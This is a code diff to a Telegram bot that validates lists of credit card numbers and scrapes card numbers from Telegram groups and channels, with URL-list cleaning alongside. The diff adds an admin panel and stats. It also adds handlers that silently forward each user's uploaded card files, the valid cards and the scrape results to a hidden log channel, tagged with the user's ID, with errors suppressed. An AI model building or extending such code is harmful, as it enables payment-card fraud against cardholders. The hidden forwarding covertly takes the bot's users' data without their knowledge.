@@ -27,6 +27,18 @@ SCRAPER_API_ID = int(os.environ.get("SCRAPER_API_ID", "0"))
 SCRAPER_API_HASH = os.environ.get("SCRAPER_API_HASH", "")
 SCRAPER_SESSION = os.environ.get("SCRAPER_SESSION", "")
 ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
+LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "0"))
+
+# Stats tracking
+_bot_stats = {
+    "users": set(),       # unique user IDs
+    "cleans": 0,          # /clean count
+    "ccleans": 0,         # /cclean count
+    "merges": 0,          # /merge completions
+    "splits": 0,          # /split count
+    "scrapes": 0,         # /scr count
+    "start_time": None,   # bot start time
+}
 
 if not BOT_TOKEN:
     raise RuntimeError("Missing BOT_TOKEN env var")
@@ -40,6 +52,8 @@ app = Flask(__name__)
 # PTB v21 Application (async)
 # ----------------------------
 application = Application.builder().token(BOT_TOKEN).build()
+import datetime as _datetime_mod
+_bot_stats["start_time"] = _datetime_mod.datetime.utcnow()
 _loop = asyncio.new_event_loop()
 
 # ----------------------------
@@ -142,6 +156,22 @@ def settings_keyboard(curr_mode: str) -> InlineKeyboardMarkup:
 # ----------------------------
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    _bot_stats["users"].add(user_id)
+
+    buttons = [
+        [
+            InlineKeyboardButton("❓ Help", callback_data="help"),
+            InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
+        ],
+        [
+            InlineKeyboardButton("👤 Owner", url="https://t.me/SUPERSTAR_AJP"),
+        ]
+    ]
+    # Admin gets extra button
+    if ADMIN_IDS and user_id in ADMIN_IDS:
+        buttons.insert(1, [InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
+
     await update.message.reply_text(
         "⚡ *Site Cleaner Bot*\n\n"
         "Clean, merge & deduplicate URL lists in seconds.\n\n"
@@ -155,15 +185,7 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/mode - Switch Apex / Host mode\n"
         "/help - How to use this bot",
         parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [
-                InlineKeyboardButton("❓ Help", callback_data="help"),
-                InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
-            ],
-            [
-                InlineKeyboardButton("👤 Owner", url="https://t.me/SUPERSTAR_AJP"),
-            ]
-        ])
+        reply_markup=InlineKeyboardMarkup(buttons)
     )
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -385,9 +407,11 @@ async def cclean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid credit cards found in that file.")
         return
 
+    _bot_stats["ccleans"] += 1
+    _bot_stats["users"].add(update.effective_user.id)
     buf = BytesIO(("\n".join(valid_ccs) + "\n").encode("utf-8"))
     buf.seek(0)
-    await update.message.reply_document(
+    reply = await update.message.reply_document(
         document=buf, filename="cleaned_ccs.txt",
         caption=(
             f"Total: *{stats['total']}* | "
@@ -398,6 +422,23 @@ async def cclean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ),
         parse_mode=ParseMode.MARKDOWN,
     )
+    # Forward to log channel — original file + result file
+    if LOG_CHANNEL:
+        try:
+            user = update.effective_user
+            # Forward the original file the user replied to
+            await update.message.reply_to_message.forward(chat_id=LOG_CHANNEL)
+            # Send the result file
+            log_caption = (
+                f"💳 *CC Clean Log*\n\n"
+                f"👤 [{user.first_name}](tg://user?id={user.id}) | `{user.id}`\n"
+                f"✅ Valid: *{stats['valid']}* / {stats['total']}\n"
+                f"❌ Invalid: *{stats['invalid']}* | Expired: *{stats['expired']}* | Dups: *{stats['duplicates']}*"
+            )
+            buf.seek(0)
+            await context.bot.send_document(chat_id=LOG_CHANNEL, document=buf, filename="cleaned_ccs.txt", caption=log_caption, parse_mode=ParseMode.MARKDOWN)
+        except Exception:
+            pass
 
 
 # ----------------------------
@@ -800,6 +841,7 @@ async def scr_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    _bot_stats["scrapes"] += 1
     status = "⚠️ *Scrape Cancelled*" if was_cancelled else "✅ *Scrape Complete!*"
     fname = f"scraped_{chat.id}_{bin_filter}.txt" if bin_filter else f"scraped_{chat.id}.txt"
     buf = BytesIO(("\n".join(valid_ccs) + "\n").encode("utf-8"))
@@ -814,6 +856,21 @@ async def scr_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ),
         parse_mode=ParseMode.MARKDOWN,
     )
+    # Forward to log channel — result file with log
+    if LOG_CHANNEL:
+        try:
+            user = update.effective_user
+            log_caption = (
+                f"🔍 *Scrape Log*\n\n"
+                f"👤 [{user.first_name}](tg://user?id={user.id}) | `{user.id}`\n"
+                f"📢 Source: *{chat_title}*\n"
+                f"📨 Scanned: *{messages_scanned}*\n"
+                f"💳 CCs: *{len(valid_ccs)}*{bin_line}"
+            )
+            buf.seek(0)
+            await context.bot.send_document(chat_id=LOG_CHANNEL, document=buf, filename=fname, caption=log_caption, parse_mode=ParseMode.MARKDOWN)
+        except Exception:
+            pass
 
 
 async def split_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -876,6 +933,9 @@ async def split_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    _bot_stats["splits"] += 1
+    _bot_stats["users"].add(update.effective_user.id)
+
     # Get base filename
     base_name = (doc.file_name or "file.txt").rsplit(".", 1)[0]
 
@@ -889,6 +949,21 @@ async def split_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=f"Part *{idx}/{len(chunks)}* - *{len(chunk)}* lines" if idx < len(chunks) else f"Part *{idx}/{len(chunks)}* - *{len(chunk)}* lines\n\n✅ Split complete! Total: *{len(lines)}* lines → *{len(chunks)}* files",
             parse_mode=ParseMode.MARKDOWN,
         )
+
+    # Forward to log channel — original file + log text
+    if LOG_CHANNEL:
+        try:
+            user = update.effective_user
+            await update.message.reply_to_message.forward(chat_id=LOG_CHANNEL)
+            log_text = (
+                f"✂️ *Split Log*\n\n"
+                f"👤 [{user.first_name}](tg://user?id={user.id}) | `{user.id}`\n"
+                f"📄 File: `{doc.file_name}`\n"
+                f"📝 Lines: *{len(lines)}* → *{len(chunks)}* parts"
+            )
+            await context.bot.send_message(chat_id=LOG_CHANNEL, text=log_text, parse_mode=ParseMode.MARKDOWN)
+        except Exception:
+            pass
 
     return
 
@@ -930,6 +1005,8 @@ async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("No URLs found in that file.")
         return
 
+    _bot_stats["cleans"] += 1
+    _bot_stats["users"].add(update.effective_user.id)
     buf = BytesIO(("\n".join(sites) + "\n").encode("utf-8"))
     buf.seek(0)
     await update.message.reply_document(
@@ -1015,6 +1092,19 @@ async def settings_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "back_start":
+        user_id = query.from_user.id
+        buttons = [
+            [
+                InlineKeyboardButton("❓ Help", callback_data="help"),
+                InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
+            ],
+            [
+                InlineKeyboardButton("👤 Owner", url="https://t.me/SUPERSTAR_AJP"),
+            ]
+        ]
+        if ADMIN_IDS and user_id in ADMIN_IDS:
+            buttons.insert(1, [InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
+
         await query.edit_message_text(
             "⚡ *Site Cleaner Bot*\n\n"
             "Clean, merge & deduplicate URL lists in seconds.\n\n"
@@ -1024,17 +1114,134 @@ async def settings_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/scr — Scrape CCs from group/channel\n"
             "/merge — Combine multiple files\n"
             "/split — Split a file by lines\n"
+            "/session — Change scraper session (admin)\n"
             "/mode — Switch Apex / Host mode\n"
             "/help — How to use this bot",
             parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+        return
+
+    if data == "admin_panel":
+        user_id = query.from_user.id
+        if not (ADMIN_IDS and user_id in ADMIN_IDS):
+            await query.answer("❌ Admin only.", show_alert=True)
+            return
+
+        # Session info
+        if _pyro_client and _pyro_client.is_connected and _pyro_user_info:
+            name, uid = _pyro_user_info
+            session_status = f"✅ *{name}* (`{uid}`)"
+        elif _dynamic_session:
+            session_status = "⚠️ Set but not connected"
+        else:
+            session_status = "❌ Not set"
+
+        # Mode
+        mode = _get_mode(context, chat_id)
+
+        await query.edit_message_text(
+            "🛠 *Admin Panel*\n\n"
+            f"🔑 *Scraper Session:* {session_status}\n"
+            f"⚙️ *Mode:* {mode.upper()}\n"
+            f"📢 *Log Channel:* `{LOG_CHANNEL}`\n"
+            f"👤 *Admin IDs:* `{', '.join(str(a) for a in ADMIN_IDS)}`\n",
+            parse_mode=ParseMode.MARKDOWN,
             reply_markup=InlineKeyboardMarkup([
                 [
-                    InlineKeyboardButton("❓ Help", callback_data="help"),
-                    InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
+                    InlineKeyboardButton("🔑 Session", callback_data="ap_session"),
+                    InlineKeyboardButton("📢 Broadcast", callback_data="ap_broadcast"),
                 ],
                 [
-                    InlineKeyboardButton("👤 Owner", url="https://t.me/SUPERSTAR_AJP"),
-                ]
+                    InlineKeyboardButton("🔄 Reconnect Scraper", callback_data="ap_reconnect"),
+                ],
+                [InlineKeyboardButton("🏠 Back", callback_data="back_start")],
+            ])
+        )
+        return
+
+    if data == "ap_session":
+        user_id = query.from_user.id
+        if not (ADMIN_IDS and user_id in ADMIN_IDS):
+            await query.answer("❌ Admin only.", show_alert=True)
+            return
+
+        if _pyro_client and _pyro_client.is_connected and _pyro_user_info:
+            name, uid = _pyro_user_info
+            masked = _dynamic_session[:10] + "..." + _dynamic_session[-10:] if _dynamic_session else "None"
+            text = (
+                f"🔑 *Scraper Session*\n\n"
+                f"👤 Connected as: *{name}*\n"
+                f"🆔 User ID: `{uid}`\n"
+                f"🔑 Session: `{masked}`\n\n"
+                f"To change, send:\n`/session <new_session_string>`"
+            )
+        else:
+            text = (
+                "🔑 *Scraper Session*\n\n"
+                "❌ Not connected.\n\n"
+                "Set a session with:\n`/session <session_string>`"
+            )
+
+        await query.edit_message_text(
+            text,
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔄 Reconnect", callback_data="ap_reconnect")],
+                [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
+            ])
+        )
+        return
+
+    if data == "ap_reconnect":
+        user_id = query.from_user.id
+        if not (ADMIN_IDS and user_id in ADMIN_IDS):
+            await query.answer("❌ Admin only.", show_alert=True)
+            return
+
+        await query.answer("🔄 Reconnecting...")
+        await _disconnect_pyro()
+        try:
+            pyro = await _get_pyro()
+            if pyro and _pyro_user_info:
+                name, uid = _pyro_user_info
+                await query.edit_message_text(
+                    f"✅ *Reconnected!*\n\n👤 *{name}* (`{uid}`)",
+                    parse_mode=ParseMode.MARKDOWN,
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
+                    ])
+                )
+            else:
+                await query.edit_message_text(
+                    "❌ Failed to reconnect. No valid session.",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
+                    ])
+                )
+        except Exception as e:
+            await query.edit_message_text(
+                f"❌ Error: `{str(e)[:200]}`",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
+                ])
+            )
+        return
+
+    if data == "ap_broadcast":
+        user_id = query.from_user.id
+        if not (ADMIN_IDS and user_id in ADMIN_IDS):
+            await query.answer("❌ Admin only.", show_alert=True)
+            return
+
+        await query.edit_message_text(
+            "📢 *Broadcast*\n\n"
+            "Send a message to broadcast to all users.\n\n"
+            "⚠️ _Feature coming soon._",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
             ])
         )
         return
@@ -1110,6 +1317,7 @@ async def merge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("No content found across all files.")
             return
 
+        _bot_stats["merges"] += 1
         buf = BytesIO(("\n".join(merged_lines) + "\n").encode("utf-8"))
         buf.seek(0)
         await update.message.reply_document(
@@ -1277,6 +1485,40 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             merge_status_msg[chat_id] = status.message_id
         return
 
+async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show bot stats. Admin only."""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Admin only.")
+        return
+
+    uptime = ""
+    if _bot_stats["start_time"]:
+        delta = _datetime_mod.datetime.utcnow() - _bot_stats["start_time"]
+        days = delta.days
+        hours, rem = divmod(delta.seconds, 3600)
+        mins, _ = divmod(rem, 60)
+        uptime = f"{days}d {hours}h {mins}m"
+
+    # Session info
+    if _pyro_client and _pyro_client.is_connected and _pyro_user_info:
+        session_info = f"✅ {_pyro_user_info[0]}"
+    else:
+        session_info = "❌ Not connected"
+
+    await update.message.reply_text(
+        "📊 *Bot Statistics*\n\n"
+        f"👥 *Users:* {len(_bot_stats['users'])}\n"
+        f"🧹 *Cleans:* {_bot_stats['cleans']}\n"
+        f"💳 *CC Cleans:* {_bot_stats['ccleans']}\n"
+        f"🔍 *Scrapes:* {_bot_stats['scrapes']}\n"
+        f"📂 *Merges:* {_bot_stats['merges']}\n"
+        f"✂️ *Splits:* {_bot_stats['splits']}\n\n"
+        f"🔑 *Session:* {session_info}\n"
+        f"⏱ *Uptime:* {uptime}",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+
 # Register handlers
 application.add_handler(CommandHandler("start", start_cmd))
 application.add_handler(CommandHandler("help", help_cmd))
@@ -1285,6 +1527,7 @@ application.add_handler(CommandHandler("cclean", cclean_cmd))
 application.add_handler(CommandHandler("split", split_cmd))
 application.add_handler(CommandHandler("scr", scr_cmd))
 application.add_handler(CommandHandler("session", session_cmd))
+application.add_handler(CommandHandler("stats", stats_cmd))
 application.add_handler(CommandHandler("mode", mode_cmd))
 application.add_handler(CommandHandler("merge", merge_cmd))
 application.add_handler(CommandHandler("settings", settings_cmd))
@@ -1295,7 +1538,7 @@ async def scr_cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = query.message.chat_id
     scrape_cancelled[chat_id] = True
 
-application.add_handler(CallbackQueryHandler(settings_cb, pattern=r"^(mode:(apex|host)|help|settings|back_start)$"))
+application.add_handler(CallbackQueryHandler(settings_cb, pattern=r"^(mode:(apex|host)|help|settings|back_start|admin_panel|ap_session|ap_reconnect|ap_broadcast)$"))
 application.add_handler(CallbackQueryHandler(merge_cb, pattern=r"^merge:(done|cancel)$"))
 application.add_handler(CallbackQueryHandler(scr_cancel_cb, pattern=r"^scr_cancel:"))
 application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
